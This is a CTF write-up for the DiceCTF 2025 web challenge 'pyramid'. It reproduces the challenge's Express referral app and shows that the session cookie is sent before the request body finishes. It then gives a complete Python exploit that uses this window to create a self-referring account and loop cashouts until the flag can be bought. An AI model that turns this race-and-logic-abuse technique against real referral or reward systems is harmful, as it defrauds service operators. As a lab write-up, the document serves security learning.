---
title: "Dice25: Writeup for web/pyramid"
date: 2025-04-15T10:42:39+01:00
tags: ["ctf", "write-up"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Pyramid"
summary: "Exploited Node.js streams to self-refer, bypassing real users for coins."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

- **CTF**: Dice CTF 2025
- **Challenge**: pyramid
- **Category**: Web Exploitation
- **Points**: 138 (58 solves)
- **Description**: Would you like to buy some supplements?
- **Source code**: [index.js](https://static.dicega.ng/uploads/294e6a22f2ab7d9d082199fcc0b78d9c0a73882ff6975836280d7e3c146c3955/index.js)

## TL;DR

This challenge involved exploiting how Node.js handles streams and events in an HTTP server. By understanding the event-driven nature of Node.js, especially how `request.on('data')` and `request.on('end')` behave, we manipulated the request flow. An attacker can self-refer and quickly multiply referrals, accumulating the required 100 billion coins to purchase the flag. This bypasses the need for real users.

## Initial Analysis

![registration page](/blog/images/2025-04-15-11-05-05.png)

At first glance, this looks like your classic referral-based app: users can register,
refer others, and exchange referrals for coins. Once you have enough coins, you can buy the flag. Simple enough.

![purchase-flag](/blog/images/2025-04-15-11-05-38.png)

Checking the source code:

```javascript
const express = require('express')
const crypto = require('crypto')
const app = express()

const css = `
    <link
        rel="stylesheet"
        href="https://unpkg.com/axist@latest/dist/axist.min.css"
    >
`

const users = new Map()
const codes = new Map()

const random = () => crypto.randomBytes(16).toString('hex')
const escape = (str) => str.replace(/</g, '&lt;')
const referrer = (code) => {
    if (code && codes.has(code)) {
        const token = codes.get(code)
        if (users.has(token)) {
            return users.get(token)
        }
    }
    return null
}

app.use((req, _res, next) => {
    const token = req.headers.cookie?.split('=')?.[1]
    if (token) {
        req.token = token
        if (users.has(token)) {
            req.user = users.get(token)
        }
    }
    next()
})

app.get('/', (req, res) => {
    res.type('html')

    if (req.user) {
        res.end(`
            ${css}
            <h1>Account: ${escape(req.user.name)}</h1>
            You have <strong>${req.user.bal}</strong> coins.
            You have referred <strong>${req.user.ref}</strong> users.

            <hr>

            <form action="/code" method="GET">
                <button type="submit">Generate referral code</button>
            </form>
            <form action="/cashout" method="GET">
                <button type="submit">
                    Cashout ${req.user.ref} referrals
                </button>
            </form>
            <form action="/buy" method="GET">
                <button type="submit">Purchase flag</button>
            </form>
        `)
    } else {
        res.end(`
            ${css}
            <h1>Register</h1>
            <form action="/new" method="POST">
                <input name="name" type="text" placeholder="Name" required>
                <input
                    name="refer"
                    type="text"
                    placeholder="Referral code (optional)"
                >
                <button type="submit">Register</button>
            </form>
        `)
    }
})

app.post('/new', (req, res) => {
    const token = random()

    const body = []
    req.on('data', Array.prototype.push.bind(body))
    req.on('end', () => {
        const data = Buffer.concat(body).toString()
        const parsed = new URLSearchParams(data)
        const name = parsed.get('name')?.toString() ?? 'JD'
        const code = parsed.get('refer') ?? null

        // referrer receives the referral
        const r = referrer(code)
        if (r) { r.ref += 1 }

        users.set(token, {
            name,
            code,
            ref: 0,
            bal: 0,
        })
    })

    res.header('set-cookie', `token=${token}`)
    res.redirect('/')
})

app.get('/code', (req, res) => {
    const token = req.token
    if (token) {
        const code = random()
        codes.set(code, token)
        res.type('html').end(`
            ${css}
            <h1>Referral code generated</h1>
            <p>Your code: <strong>${code}</strong></p>
            <a href="/">Home</a>
        `)
        return
    }
    res.end()
})

// referrals translate 1:1 to coins
// you receive half of your referrals as coins
// your referrer receives the other half as kickback
//
// if your referrer is null, you can turn all referrals into coins
app.get('/cashout', (req, res) => {
    if (req.user) {
        const u = req.user
        const r = referrer(u.code)
        if (r) {
            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
        } else {
            [u.ref, u.bal] = [0, u.bal + u.ref]
        }
    }
    res.redirect('/')
})

app.get('/buy', (req, res) => {
    if (req.user) {
        const user = req.user
        if (user.bal > 100_000_000_000) {
            user.bal -= 100_000_000_000
            res.type('html').end(`
                ${css}
                <h1>Successful purchase</h1>
                <p>${process.env.FLAG}</p>
            `)
            return
        }
    }
    res.type('html').end(`
        ${css}
        <h1>Not enough coins</h1>
        <a href="/">Home</a>
    `)
})

app.listen(3000)
```

Fairly simple Express.js app with a referral system. Here's how it works:

1. **Referral Codes**:
   - Registered users can generate their own referral codes. When new users sign up using those codes, it adds to the referrer’s count.

2. **Earning Coins**:
   - Users earn coins by referring others. They get half of the coins from their referrals, and the person who referred them gets the other half.

3. **Cashout**:
   - Users can “cash out” their referrals for coins. If they don’t have a referrer, they get all the coins from their referrals.

4. **Buying the Flag**:
   - Once users collect 100 billion coins, they can buy the flag and get it displayed on the page.

Tokens are stored in cookies, and the whole thing runs on a basic event-driven system.

---

Until now everything seems normal, but few things didn’t sit right.

The first was the **cashout mechanic**. The rules were odd. Here’s what it says in the code:

```js
// referrals translate 1:1 to coins
// you receive half of your referrals as coins
// your referrer receives the other half as kickback
//
// if your referrer is null, you can turn all referrals into coins
```

That last line is where I paused:
> _“If your referrer is null, you can turn all referrals into coins.”_

This introduces an interesting asymmetry. Normally, a referral rewards two people — you and your referrer — but if you're a root user (with no referrer), you get **everything**. That’s a subtle but powerful difference.

So naturally, I wondered:
**Can I abuse this difference to multiply referrals without involving real users?**

It wasn’t clear how at first — but the mechanism definitely seemed ripe for something unintended.

The second is the use of `req.on()`. I've never used those to handle user data before.

## Task Analysis

When I started tackling the challenge, I tried going down the intended route. The issue? You need an astronomical number of referrals to reach the required 100_000_000_000 coins. That's simply not practical.

![scam-meme](/blog/images/2025-04-15-10-49-17.png)

---

Let's focus on this code:

```javascript
// referrals translate 1:1 to coins
// you receive half of your referrals as coins
// your referrer receives the other half as kickback
//
// if your referrer is null, you can turn all referrals into coins
app.get('/cashout', (req, res) => {
    if (req.user) {
        const u = req.user
        const r = referrer(u.code)
        if (r) {
            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
        } else {
            [u.ref, u.bal] = [0, u.bal + u.ref]
        }
    }
    res.redirect('/')
})
```

Basically, referrals get split 50/50 between you and whoever referred you. But here’s the catch: if you can make your own user refer themselves — that is, make r = u — the logic breaks in your favor.

Let's do some math:

```javascript
[u.ref, u.ref, u.bal] = [0, u.ref + u.ref / 2, u.bal + u.ref / 2]
```

Which simplifies to this:

```javascript
u.ref = 1.5 * u.ref // (effectively grows each time)
u.bal += 0.5 * u.ref // (from before)
```

So each time you /cashout, your referral count increases by 50%. That means faster growth. After a few iterations, you’ll hit the required balance quickly — no need to invite real users.

But the real question is: how do we refer ourselves?

The app ties users and their referral codes to tokens, and tokens are only set **after** user registration. That means you shouldn’t be able to refer yourself during registration... or can you?

---

Turns out, this isn’t your usual Express app. While it uses Express for routing, the actual user creation is done by listening to **Node.js core HTTP events**, particularly the 'data' and 'end' events on the request object.

screenshot: of expressjs indication that you can use node's original stuff for handling

That means the user is only fully created once the `'end'` event is emitted — after the request body is fully received.

This behavior falls under what's called **event-driven programming** — basically, code execution is triggered by events like "data received" or "request ended." In Node.js, the core `http` module lets you manually handle these events using `req.on(...)`.

> Express still uses Node’s HTTP module under the hood. You can read more about event-driven programming [here]()

---

But here’s where it gets interesting: Express handlers are called *as soon as* headers are received, even if the body isn’t sent yet. We can prove this with a small demo:

1. Create a small ExpressJS application:

```bash
npm init
npm install express
```

```javascript
const express = require('express');
const app = express();

app.post('/test', (req, res) => {
    console.log('Route handler triggered!');
    res.send('ok');
});

app.listen(3000, () => console.log('Listening on http://localhost:3000'));
```

2. Now send just the headers (not the full body) using this script:

```bash
#!/usr/bin/env bash

(
    echo -e "POST /test HTTP/1.1\r";
    echo -e "Host: localhost\r";
    echo -e "Content-Length: 999\r";
    sleep 5; # DO NOT send the final blank line that terminates headers, wait and see that server hangs
    echo -e "\r"; # you should see a response once this happens
) | nc localhost 3000
```

![route-handler-triggered](/blog/images/2025-04-15-10-46-28.png)

See. The server doesn’t wait for the full body to call the route logic. That's because Express registers handlers early — and starts sending back a response early too.

Why does that matter?

Because in our vulnerable app, the response sets a cookie `(token=...)` before the request finishes. This will give us a small window to do what we want: **Getting the flag**.

## Exploitation

Armed with this newfound knowledge, we know exactly what we need to do: We need to register a user that self-refers himself and cashes out as many times as needed for his account balance to reach the target 100_000_000_000.

We exploit the fact that, in Node's HTTP module, the response headers are sent once the request headers are transmitted, but before the request body is fully processed (no "end" event triggered yet). This allows us to retrieve the token from the response and append it to the rest of the request, enabling the creation of our malicious user.

> the `name` field in the request is not necessary.

Alright, let's get to business. I'll be using [pwntools]() to deliver the attack.

1. Create a TCP connection with the server and keep it alive so we can receive the response headers:

```python
from pwn import *

# Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6.
connection = remote('localhost', 3000)

# Send an HTTP request without closing (server doesn't emit 'end' event)
connection.send(
    (
        b'POST /new HTTP/1.1\r\n'
        b'Host: localhost\r\n'
        b'Transfer-Encoding: chunked\r\n'
        b'Content-Type: application/x-www-form-urlencoded\r\n'
        b'\r\n'
    )
)
# Do simple string manipulation to extract the token from the response headers
token = connection.recv().decode().split('token=')[1].split('\r\n')[0]
```

{{< notice tip >}}
I used Transfer-Encoding: chunked because I didn't bother calculating the length of the code. You can use Content-Length header just fine
{{< /notice >}}

2. Nice, we got the token (our user identifier). Now, let's create a code that refers to this user:

```python
code = requests.get('http://localhost:3000/code', cookies={'token': token}).text.split('<strong>')[1].split('</strong>')[0]
```

3. Complete the request with the chunked data, including `refer=code`:

```python
code_chunk = b'refer=' + code.encode()

# Complete request to create a self-referring account
connection.send(
    (
        f'{len(code_chunk):X}\r\n'.encode() +
        code_chunk +
        b'\r\n' +
        b'0'
        b'\r\n' # end of the zero chunk
        b'\r\n' # end of the whole body
    )
)
```

This will trigger the "end" event and create a self-referring user. The next steps are straightforward:

```python
# Create an account that increase our original account's refer count (0 * anything = 0 innit xD)
requests.post('http://localhost:3000/new', data={'refer':code})

# Increase the ref count by 1.5
for _ in range(70):
    requests.get('http://localhost:3000/cashout', cookies={'token': token})

# Buy the FLAG
flag = requests.get('http://localhost:3000/buy', cookies={'token': token}).text
print(flag)
```

Putting everything together, the complete script is as follows:

```python
#!/usr/bin/env python3

import requests
from pwn import *

# Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6.
connection = remote('localhost', 3000)

# Send an HTTP request without closing (server doesn't emit 'end' event)
connection.send(
    (
        b'POST /new HTTP/1.1\r\n'
        b'Host: localhost\r\n'
        b'Transfer-Encoding: chunked\r\n'
        b'Content-Type: application/x-www-form-urlencoded\r\n'
        b'\r\n'
    )
)
token = connection.recv().decode().split('token=')[1].split('\r\n')[0]

# Generate chunks to send
code = requests.get('http://localhost:3000/code', cookies={'token': token}).text.split('<strong>')[1].split('</strong>')[0]
code_chunk = b'refer=' + code.encode()

# Complete request to create a self-referring account
connection.send(
    (
        f'{len(code_chunk):X}\r\n'.encode() +
        code_chunk +
        b'\r\n' +
        b'0'
        b'\r\n' # end of the zero chunk
        b'\r\n' # end of the whole body (not necessary?)
    )
)

# Create an account that increase our original account's refer count
requests.post('http://localhost:3000/new', data={'refer':code})

# Increase the ref count by 1.5
for _ in range(70):
    requests.get('http://localhost:3000/cashout', cookies={'token': token})

# Buy the FLAG
flag = requests.get('http://localhost:3000/buy', cookies={'token': token}).text.split('<p>')[1].split('</p>')[0]
print(flag)
```

Flag is: `dice{007227589c05e703}`

![celebrating-flag](/blog/images/2025-04-15-11-14-30.png)

## Conclusions

What we learned in this challenge:

1. **HTTP request body handling is asynchronous**
2. **Race conditions in Express route handlers**
3. **Self-referral logic abuse**

## References

If you're interested to learn more, here is a list of useful references:

- [Event-driven programming - Wikipedia](https://en.wikipedia.org/wiki/Event-driven_programming)
- [Node.js Events API](https://nodejs.org/docs/latest/api/events.html#events_emitter_on_event_listener)
- [Understanding `request.on(...)` in Node.js – Stack Overflow](https://stackoverflow.com/questions/12892717/in-node-js-request-on-what-is-it-this-on)
- [MDN: `RegExp` - Regular Expressions in JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp)
- [MDN: `Map.prototype.has`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/has)
- [MDN: `Map.prototype.get`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/get)
- [Node.js `http.ClientRequest` Class](https://nodejs.org/api/http.html#class-httpclientrequest)
- [YouTube: Node.js Stream Crash Course](https://www.youtube.com/watch?v=aTThXMRxmiE)
- [Difference between `res.end()` and `res.send()` – Stack Overflow](https://stackoverflow.com/questions/29555290/what-is-the-difference-between-res-end-and-res-send#49242271)
- [RFC 7230 – Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing](https://www.packetizer.com/rfc/rfc7230/)

